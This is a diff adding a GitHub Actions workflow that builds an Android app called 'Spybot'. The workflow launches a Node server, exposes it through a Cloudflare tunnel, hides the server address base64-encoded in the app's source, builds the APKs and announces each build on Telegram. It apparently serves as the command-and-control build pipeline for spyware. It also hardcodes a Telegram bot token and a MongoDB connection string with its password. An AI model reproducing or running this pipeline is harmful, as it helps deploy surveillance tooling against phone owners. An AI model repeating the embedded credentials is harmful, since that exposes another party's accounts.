@@ -1,0 +1,198 @@
+name: Deploy Server & Build APK
+
+on:
+  workflow_dispatch:
+    inputs:
+      duration:
+        description: "Server runtime (minutes)"
+        required: true
+        default: "30"
+        type: choice
+        options: ["5", "10", "15", "30", "60"]
+
+      build_type:
+        description: "APK build type"
+        required: true
+        default: "release"
+        type: choice
+        options: ["debug", "release", "both"]
+
+      custom_base_url:
+        description: "Custom server URL (e.g. https://yourserver.com). Leave empty to auto-create Cloudflare tunnel."
+        required: false
+        default: ""
+        type: string
+
+jobs:
+  deploy-and-build:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+
+    steps:
+      # ──────────────────────────────────────────────────
+      # CHECKOUT
+      # ──────────────────────────────────────────────────
+      - uses: actions/checkout@v4
+
+      # ──────────────────────────────────────────────────
+      # DETECT APP VERSION
+      # ──────────────────────────────────────────────────
+      - name: Detect app version
+        id: version
+        run: |
+          FILE=$(find ./app -name "build.gradle*" | head -n 1)
+          VERSION=$(grep "versionName" "$FILE" | head -1 | sed 's/.*versionName[ =]*"\{0,1\}//' | sed 's/".*//')
+          echo "version_name=$VERSION" >> $GITHUB_OUTPUT
+
+      # ──────────────────────────────────────────────────
+      # NODE / SERVER SETUP
+      # ──────────────────────────────────────────────────
+      - name: Setup Node
+        uses: actions/setup-node@v4
+        with:
+          node-version: 20
+
+      - name: Install server dependencies
+        working-directory: ./server
+        run: npm install
+
+      - name: Create server .env
+        working-directory: ./server
+        run: |
+          printf 'TELEGRAM_BOT_TOKEN=8764095413:AAEHztWz7XDLOhoLucXTmrQEls_ZLE-mNBQ\n' > .env
+          printf 'TELEGRAM_CHAT_ID=6367574197\n' >> .env
+          printf 'MONGO_URI=mongodb+srv://kashifrazamallah207_db_user:k0dThUgXyB5JikMc@cluster0.loym4oh.mongodb.net/?appName=Cluster0\n' >> .env
+          printf 'PORT=8999\n' >> .env
+
+      - name: Start server
+        working-directory: ./server
+        run: |
+          nohup npm start > /tmp/server.log 2>&1 &
+          echo "Waiting for server to start..."
+          for i in {1..20}; do
+            if curl -s http://localhost:8999/ > /dev/null 2>&1; then
+              echo "✅ Server running"
+              break
+            fi
+            sleep 3
+          done
+
+      # ──────────────────────────────────────────────────
+      # CLOUDFLARE TUNNEL (only if no custom URL)
+      # ──────────────────────────────────────────────────
+      - name: Create Cloudflare tunnel
+        id: tunnel
+        if: ${{ github.event.inputs.custom_base_url == '' }}
+        run: |
+          curl -L -o cloudflared.deb https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64.deb
+          sudo dpkg -i cloudflared.deb
+          nohup cloudflared tunnel --url http://localhost:8999 > /tmp/tunnel.log 2>&1 &
+          echo "Waiting for Cloudflare tunnel URL..."
+          for i in {1..40}; do
+            sleep 3
+            URL=$(grep -oE 'https://[a-zA-Z0-9.-]+\.trycloudflare\.com' /tmp/tunnel.log | head -1 || true)
+            if [ -n "$URL" ]; then
+              echo "tunnel_url=$URL" >> $GITHUB_OUTPUT
+              echo "✅ Tunnel ready: $URL"
+              break
+            fi
+          done
+          if [ -z "$URL" ]; then
+            echo "❌ Cloudflare tunnel failed"; cat /tmp/tunnel.log; exit 1
+          fi
+
+      # ──────────────────────────────────────────────────
+      # RESOLVE FINAL SERVER URL
+      # ──────────────────────────────────────────────────
+      - name: Set server URL
+        id: serverurl
+        run: |
+          CUSTOM="${{ github.event.inputs.custom_base_url }}"
+          TUNNEL="${{ steps.tunnel.outputs.tunnel_url }}"
+          if [ -n "$CUSTOM" ]; then
+            BASE="${CUSTOM%/}"
+          else
+            BASE="$TUNNEL"
+          fi
+          echo "base_url=${BASE}/" >> $GITHUB_OUTPUT
+          SOCKET=$(echo "$BASE" | sed -E 's|^https|wss|;s|^http|ws|')
+          echo "socket_url=${SOCKET}/" >> $GITHUB_OUTPUT
+          echo "Final URL: ${BASE}/"
+
+      # ──────────────────────────────────────────────────
+      # INJECT URL INTO APK SOURCE
+      # ──────────────────────────────────────────────────
+      - name: Inject server URL into AppTools.kt
+        run: |
+          HOST="${{ steps.serverurl.outputs.base_url }}"
+          SOCKET="${{ steps.serverurl.outputs.socket_url }}"
+          JSON="{\"host\":\"$HOST\",\"socket\":\"$SOCKET\"}"
+          DATA=$(echo -n "$JSON" | base64 -w0)
+          FILE="./app/app/src/main/java/com/spybot/app/Utils/AppTools.kt"
+          sed -i "s|private const val DEFAULT_DATA = \".*\"|private const val DEFAULT_DATA = \"$DATA\"|" "$FILE"
+          echo "✅ Injected server URL: $HOST"
+
+      # ──────────────────────────────────────────────────
+      # BUILD APK
+      # ──────────────────────────────────────────────────
+      - uses: actions/setup-java@v4
+        with:
+          distribution: temurin
+          java-version: 17
+          cache: gradle
+
+      - name: Build APK
+        working-directory: ./app
+        run: |
+          chmod +x gradlew
+          case "${{ github.event.inputs.build_type }}" in
+            debug)   ./gradlew assembleDebug --no-daemon ;;
+            release) ./gradlew assembleRelease --no-daemon ;;
+            both)    ./gradlew assembleDebug assembleRelease --no-daemon ;;
+          esac
+
+      # ──────────────────────────────────────────────────
+      # COLLECT & UPLOAD APK
+      # ──────────────────────────────────────────────────
+      - name: Collect APKs
+        run: |
+          mkdir -p output
+          find ./app -name "*.apk" -type f | while read f; do
+            NAME=$(basename "$f" .apk)
+            cp "$f" "output/Spybot-v${{ steps.version.outputs.version_name }}-${NAME}.apk"
+          done
+          ls -lh output/
+
+      - name: Upload APK artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: Spybot-v${{ steps.version.outputs.version_name }}-APK
+          path: output/*.apk
+          retention-days: 30
+
+      # ──────────────────────────────────────────────────
+      # TELEGRAM NOTIFICATION
+      # ──────────────────────────────────────────────────
+      - name: Notify via Telegram
+        run: |
+          BOT="8764095413:AAEHztWz7XDLOhoLucXTmrQEls_ZLE-mNBQ"
+          CHAT="6367574197"
+          MSG="✅ Spybot v${{ steps.version.outputs.version_name }} APK Ready!%0A%0AServer: ${{ steps.serverurl.outputs.base_url }}%0ABuild: ${{ github.event.inputs.build_type }}%0A%0ADownload from Actions → Artifacts"
+          curl -s "https://api.telegram.org/bot${BOT}/sendMessage?chat_id=${CHAT}&text=${MSG}"
+
+      # ──────────────────────────────────────────────────
+      # KEEP SERVER ALIVE
+      # ──────────────────────────────────────────────────
+      - name: Keep server alive
+        run: |
+          echo "⏳ Server stays alive for ${{ github.event.inputs.duration }} minutes..."
+          sleep $(( ${{ github.event.inputs.duration }} * 60 ))
+
+      # ──────────────────────────────────────────────────
+      # CLEANUP
+      # ──────────────────────────────────────────────────
+      - name: Cleanup
+        if: always()
+        run: |
+          pkill -f cloudflared || true
+          pkill -f node || true
